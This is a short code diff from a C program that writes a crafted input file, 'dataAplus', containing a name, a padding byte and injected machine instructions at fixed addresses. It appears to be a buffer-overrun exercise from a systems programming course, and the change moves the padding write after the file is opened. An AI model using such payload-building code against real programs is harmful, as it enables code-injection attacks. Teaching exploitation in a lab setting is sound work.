@@ -11,9 +11,6 @@ int main(void) {
     unsigned int uiAdr, uiAdr1, uiB;
     FILE *psFile;
 
-    /* padding */
-    fprintf(psFile, "%c", '0');
-
     /* get name(s) to use in dataA */
     /* max name length is 48 - 1 (for nullbyte) - 4 * 4 (for the 4
     instructions) */
@@ -23,6 +20,9 @@ int main(void) {
     psFile = fopen("dataAplus", "w");
     /* write name */
     fwrite(pcInject, sizeof(char), iNameLength, psFile);
+    /* padding */
+    fprintf(psFile, "%c", '0');
+    
     /* write instructions */
     /* put address of new string in reg 0 */
     uiAdr = MiniAssembler_adr(0, 0x420070, 0x420064);
